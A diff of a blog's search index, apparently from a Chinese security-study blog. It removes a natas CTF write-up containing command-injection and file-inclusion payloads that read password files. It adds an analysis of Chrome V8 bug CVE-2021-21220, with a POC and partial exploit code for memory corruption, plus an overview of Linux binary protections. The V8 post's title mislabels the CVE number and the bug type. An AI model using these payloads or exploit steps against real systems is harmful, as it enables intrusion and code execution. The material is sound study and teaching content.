@@ -1,41 +1,100 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Web题解_natas</title>
-    <url>/2021/04/20/Web_1/</url>
-    <content><![CDATA[<h1 id="Web题解-natas"><a href="#Web题解-natas" class="headerlink" title="Web题解_natas"></a>Web题解_natas</h1><p>Easy_web入门刷题</p>
-<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a><strong>Level_0</strong></h2><p>Check Souce code</p>
-<h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a><strong>Level_0➡Level_1</strong></h2><p>Check Souce code</p>
-<h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a><strong>Level_1➡Level_2</strong></h2><p>发现有个png图片，访问上级目录可查看到有flag的txt文档</p>
-<h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a><strong>Level_2➡Level_3</strong></h2><h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a><strong>Robots协议</strong></h2><p>访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag</p>
-<h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a><strong>Level_3➡Level_4</strong></h2><p>根据提示用Burpsuite抓包改HTTPReferer发送即可</p>
-<h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a><strong>Level_4➡Level_5</strong></h2><h2 id="Learn-about-cookie"><a href="#Learn-about-cookie" class="headerlink" title="Learn about cookie"></a><strong>Learn about cookie</strong></h2><p>更改cookie中Loggedin 值为1即可</p>
-<h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a><strong>Level_5➡Level_6</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$secret</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可</p>
-<h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a><strong>Level_6➡Level_7</strong></h2><p>include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。</p>
-<h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a><strong>Level_7➡Level_8</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>根据加密过程解密即可</p>
-<p>练习一下python</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">byte=<span class="string">b&#x27;\x3d\x3d\x51\x63\x43\x74\x6d\x4d\x6d\x6c\x31\x56\x69\x56\x33\x62&#x27;</span></span><br><span class="line">t=byte.decode()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t=t[::-<span class="number">1</span>]<span class="comment">#字符切片</span></span><br><span class="line"><span class="built_in">print</span>(t) </span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
-<p>练习一下linux命令</p>
-<p>优雅简洁:)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d</span><br></pre></td></tr></table></figure>
-<p><em>-r</em> | <em>-revert</em></p>
-<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. <strong>Use the combination <em>-r</em> -p to read plain hexadecimal dumps without line number information and without a particular column layout.</strong> Additional Whitespace and line-breaks are allowed anywhere.</p>
-<h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a><strong>Level_8➡Level_9</strong></h2><h2 id="Learn-about-passthru"><a href="#Learn-about-passthru" class="headerlink" title="Learn about passthru()"></a><strong>Learn about passthru()</strong></h2><p>passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 </p>
-<p>用户输入未过滤，直接用 ; 截断grep 命令cat flag</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;cat /etc/natas_webpass/natas10</span><br></pre></td></tr></table></figure>
-<h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a><strong>Level_9➡Level_10</strong></h2><p>注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符</p>
-<h2 id="Uage-of-grep-and-regex"><a href="#Uage-of-grep-and-regex" class="headerlink" title="Uage of grep and regex"></a><strong>Uage of grep and regex</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&#x27;[A-Za-z]&#x27;</span> 文件名</span><br></pre></td></tr></table></figure>
+    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
+    <url>/2021/05/08/CVE-2021-21220/</url>
+    <content><![CDATA[<h1 id="CVE-2021-21220在野0day"><a href="#CVE-2021-21220在野0day" class="headerlink" title="CVE-2021-21220在野0day"></a>CVE-2021-21220在野0day</h1><h5 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h5><p>Google chrome 90.0.4430.72之前版本中存在安全漏洞，该漏洞源于V8优化中的数据验证不足。                 </p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>chrome&lt; 90.0.4430.72以及Microsoft Edge和其他可能基于Chromium的浏览器。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="下载exp并利用"><a href="#下载exp并利用" class="headerlink" title="下载exp并利用"></a>下载exp并利用</h5><p><img src="https://i.loli.net/2021/05/08/DSlBGEj7zLPiK3a.png" alt="exp.jpg"></p>
+<p>打开包含该漏洞的html页面，成功弹出计算器，执行恶意代码。</p>
+<h4 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h4><h5 id="what’s-V8"><a href="#what’s-V8" class="headerlink" title="what’s V8"></a>what’s V8</h5><p>V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行，而CVE-2020-16040(crbug.com/1150649)是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞。</p>
+<h5 id="V8引擎工作流程"><a href="#V8引擎工作流程" class="headerlink" title="V8引擎工作流程"></a>V8引擎工作流程</h5><p><img src="https://i.loli.net/2021/05/08/uX2F8e39DnUAYIJ.png" alt="V8.png"></p>
+<h5 id="Parser-解析器-："><a href="#Parser-解析器-：" class="headerlink" title="Parser(解析器)："></a><strong>Parser(解析器)：</strong></h5><p>负责通过对源代码进行词法分析得到的token对源代码进行语法错误分析、转换为AST抽象语法树并确定词法作用域：</p>
 <p>Demo:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[a-zA-Z] /etc/natas_webpass/natas11</span><br><span class="line">Or</span><br><span class="line">. /etc/natas_webpass/natas11</span><br></pre></td></tr></table></figure>
-<h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a><strong>Level_10➡Level_11</strong></h2><h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a><strong>Level_11➡Level_12</strong></h2><h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a><strong>Level_12➡Level_13</strong></h2><h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a><strong>Level_13➡Level_14</strong></h2><h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a><strong>Level_14➡Level_15</strong></h2><h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a><strong>Level_15➡Level_16</strong></h2><h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a><strong>Level_16➡Level_17</strong></h2><h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a><strong>Level_17➡Level_18</strong></h2><h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a><strong>Level_18➡Level_19</strong></h2><h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a><strong>Level_19➡Level_20</strong></h2><h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a><strong>Level_20➡Level_21</strong></h2><h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a><strong>Level_21➡Level_22</strong></h2><h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a><strong>Level_22➡Level_23</strong></h2><h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a><strong>Level_23➡Level_24</strong></h2><h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a><strong>Level_24➡Level_25</strong></h2><h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a><strong>Level_25➡Level_26</strong></h2><h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a><strong>Level_26➡Level_27</strong></h2><h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a><strong>Level_27➡Level_28</strong></h2><h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a><strong>Level_28➡Level_29</strong></h2><h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a><strong>Level_29➡Level_30</strong></h2><h2 id="Level30➡Level31"><a href="#Level30➡Level31" class="headerlink" title="Level30➡Level31"></a><strong>Level<em>30➡Level</em></strong>31</h2><h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a><strong>Level_31➡Level_32</strong></h2><h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a><strong>Level_32➡Level_33</strong></h2><h2 id="Level33➡Level34"><a href="#Level33➡Level34" class="headerlink" title="Level33➡Level34"></a><strong>Level<em>33➡Level</em></strong>34</h2>]]></content>
+<p><img src="https://i.loli.net/2021/05/08/mc7hrtTZsnzPMCD.png" alt="pz.jpg"></p>
+<p><strong>Ignition(解释器)</strong>：负责将 AST 转换为中间代码即字节码(Bytecode)并逐行解释执行字节码，在该阶段， JavaScript 代码就已经开始执行了。</p>
+<p>考虑如下代码bytecode.js：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+<p>使用命令./d8 bytecode.js —allow-natives-syntax —print-bytecode —print-bytecode-filter ziwu_add可得到其字节码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[generated bytecode for function: ziwu_add (0x1984082d26e1 &lt;SharedFunctionInfo ziwu_add&gt;)]</span><br><span class="line">Parameter count 3</span><br><span class="line">Register count 0</span><br><span class="line">Frame size 0</span><br><span class="line">0x1984082d2826 @    0 : 25 04             Ldar a1</span><br><span class="line">0x1984082d2828 @    2 : 35 03 00          Add a0, [0]</span><br><span class="line">0x1984082d282b @    5 : ab                Return </span><br><span class="line">Constant pool (size &#x3D; 0)</span><br><span class="line">Handler Table (size &#x3D; 0)</span><br><span class="line">Source Position Table (size &#x3D; 0)</span><br></pre></td></tr></table></figure>
+<p>Add a0, [0]即字节码，他告诉V8我们是要执行一个加法操作。</p>
+<h5 id="TurboFan-优化编译器"><a href="#TurboFan-优化编译器" class="headerlink" title="TurboFan(优化编译器)"></a><strong>TurboFan(优化编译器)</strong></h5><p>负责将字节码和一些分析数据作为输入并生成优化的机器代码，当 Ignition 将 JavaScript 代码转换为字节码后，代码开始执行，V8 会一直观察 JavaScript  代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。<strong>如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function）</strong>，并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan  会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。当某一次调用传入的信息变化时，表示 TurboFan 的假设是错误的，此时优化编译生成的机器代码就不能再使用了，于是进行优化回退，重走原复杂函数逻辑。</p>
+<p><img src="https://i.loli.net/2021/05/08/542paODGEb1NAsl.png" alt="1.png"></p>
+<p>优化Demo:</p>
+<p>优化逻辑过程如下，考虑下述代码：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">ziwu_add(<span class="string">&#x27;hack&#x27;</span>,<span class="string">&#x27;you&#x27;</span>);</span><br><span class="line">ziwu_add([],&#123;&#125;)</span><br></pre></td></tr></table></figure>
+<p>V8在每次计算时需要先判断x、y的类型，然后执行相应的处理，但如果该函数要执行很多次呢？</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">  ziwu_add(<span class="number">1</span>+i,<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>x参数持续变化，如果每次都要去判断类型是否过于繁琐，不够高效，Turbofan通过观察发现，经过了如此多的循环计算，x、y参数都是int类型，有理由相信下一次应该还是这样，那就不妨将x、y参数的类型假设为int，基于这个假设，我们可以将ziwu_add函数优化为简单的加法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add eax ebx;</span><br></pre></td></tr></table></figure>
+<h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><p>根据补丁发生变化的位置分析：</p>
+<p>漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中，Instruction Selector阶段在处理ChangeInt32ToInt64节点时，会先检查 node 的 input 节点，如果 input 节点的操作码是 Load，那么会根据该 input节点的 LoadRepresentation 和 MachineRepresentation进行一些特殊的处理，如果判断该 input 节点的 MachineRepresentation 的类型是kWord32, 那么会根据 LoadRepresentation 是有符号的还是无符号的选择对应的指令，如果是有符号的选择X64Movsxlq，在x86指令集中是有符号扩展，如果是无符号的选择X64Movl， 在x86指令集中是无符号扩展。</p>
+<p><strong>漏洞的根源是V8 对ChangeInt32ToInt64的假设是该节点的输入必定被解释为一个有符号的Int32的值，所以无论 LoadRepresentation如何，都应该使用X64Movsxlq指令。</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> InstructionSelector::<span class="function"><span class="title">VisitChangeInt32ToInt64</span>(<span class="params">Node* node</span>)</span> &#123;</span><br><span class="line">    DCHECK_EQ(node-&gt;InputCount(), <span class="number">1</span>);</span><br><span class="line">    Node* input = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;opcode() == IrOpcode::kTruncateInt64ToInt32) &#123;</span><br><span class="line">        node-&gt;ReplaceInput(<span class="number">0</span>, input-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    X64OperandGenerator g(<span class="built_in">this</span>);</span><br><span class="line">    Node* <span class="keyword">const</span> value = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (value-&gt;opcode() == IrOpcode::kLoad &amp;&amp; CanCover(node, value)) &#123;</span><br><span class="line">        LoadRepresentation load_rep = LoadRepresentationOf(value-&gt;op());</span><br><span class="line">        MachineRepresentation rep = load_rep.representation();</span><br><span class="line">        InstructionCode opcode;</span><br><span class="line">        <span class="keyword">switch</span> (rep) &#123;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kBit:<span class="comment">// Fall through.</span></span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord8:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord16:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            UNREACHABLE();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>触发漏洞POC</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span> ** <span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo()); <span class="comment">//这一行输出-2147483647</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;after optimization&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(foo());<span class="comment">//这一行输出2147483649</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>同样一个函数在优化前和优化后返回的结果不一致。在优化前，arr[0] ^ 0的结果用十六进制表示是0x80000000， 对于异或运算，JS 引擎会将结果看做一个有符号的 Int32 的值，所以异或的结果是-2147483648, 加上1 以后变成-2147483647。</p>
+<p>但是为什么优化后的结果不一致了呢，我们可以观察程序运行过程中生成的 Turbofan 的图。arr[0] ^ 0这个表达式被优化成了一个Load节点， 对应下图中的 #81 节点，而(arr[0] ^0) + 1这个加法运算被优化成了#58 ChangeInt32ToInt64节点和#50 Int64Add节点，如下图中黄色高亮部分所示，在图中可以看到，Load 节点的 MachineRepresentation 是Word32，而LoadRepresentation的类型是Uint32， 故而 Turbofan 选择了movl指令，也就是无符号扩展指令，导致 Load 节点的值会被无符号扩展为 64 位，然后和 1 相加，最后结果自然是2147483649。</p>
+<p><img src="https://i.loli.net/2021/05/08/ENX8fQpMLbOqrjK.png" alt="5.jpg"></p>
+<p><img src="https://i.loli.net/2021/05/08/oWfOR7UkB2pcCPy.png" alt="2.png"></p>
+<p>用调试器调试也可以验证，在执行到mov ecx, DWORD PTR [rcx] 这一行时，rcx寄存器指向的值为0x80000000, 无符号扩展变成了2147483648， 最后加上 1 变成了2147483649。</p>
+<p><img src="https://i.loli.net/2021/05/08/3ItTaVXbodYwic2.png" alt="3.jpg"></p>
+<h5 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(size);</span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;<span class="comment">//进行地址泄露</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));<span class="comment">//构造长度为-1的数组</span></span><br><span class="line">        arr.shift();</span><br><span class="line">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0x1122</span>;<span class="comment">//修改数组长度</span></span><br><span class="line">        <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);</span><br><span class="line">    gc(); gc();</span><br><span class="line">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p>通过代码Array(Math.sign(0 – Math.max(0, x, -1)))创建一个length为-1的数组，然后使用LeakArrayBuffer构造内存布局，将相对读写布局成绝对读写。</p>
+<p><img src="https://i.loli.net/2021/05/08/jQmvCbi89npDrFP.png" alt="4.png"></p>
+<p>这里需要说明的是，由于chrome80以上版本启用了地址压缩，地址高4个字节，可以在构造的array后面的固定偏移找到。</p>
+<p>先将corrupt_buffer的地址泄露，然后如下计算地址</p>
+<blockquote>
+<p>(corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</p>
+</blockquote>
+<p>可以计算出高4字节。</p>
+<p>同时结合0x02步骤中实现的相对读写和对象泄露，可实现绝对地址读写。@r4j0x00在issue 1196683中构造length为-1数组后，则通过伪造对象实现任意地址读写。</p>
+<p>之后，由于WASM内存具有RWX权限，因此可以将shellcode拷贝到WASM所在内存，实现任意代码执行。</p>
+]]></content>
       <categories>
-        <category>Web</category>
+        <category>CVE</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>CTF</tag>
+        <tag>堆溢出</tag>
+        <tag>CVE-2021-21220</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux程序保护机制</title>
+    <url>/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="Linux程序保护机制"><a href="#Linux程序保护机制" class="headerlink" title="Linux程序保护机制"></a>Linux程序保护机制</h1><p>​    在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:)</p>
+<h2 id="Tools-checksec"><a href="#Tools-checksec" class="headerlink" title="Tools:checksec"></a>Tools:checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo:  题目:flag</p>
+<p><img src="https://i.loli.net/2021/04/18/kOGJRsePqZuj2AM.png" alt="图片.png"></p>
+<p>下面对逐个介绍保护机制</p>
+<h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>​    在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p>
+<p>​    Function：</p>
+<p>1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作<br>“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。</p>
+<p>2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。</p>
+<p>3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。</p>
+<p>4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。</p>
+<p>5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。</p>
+<p><img src="https://i.loli.net/2021/04/18/InOpchLTMduiEj6.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2021/04/18/oFnTNEWy9baQixr.png" alt="7.jpg"></p>
+<h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p>
+<p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p>
+<p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度</p>
+<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX:no-excute不可执行</p>
+<p>基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p><img src="https://i.loli.net/2021/04/18/phJd1xmej7unXZE.png" alt="8.jpg"></p>
+<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作</p>
+<h2 id="内存地址随机化机制几种情况："><a href="#内存地址随机化机制几种情况：" class="headerlink" title="内存地址随机化机制几种情况："></a>内存地址随机化机制几种情况：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
+<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO:read only relocation </p>
+<p>由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
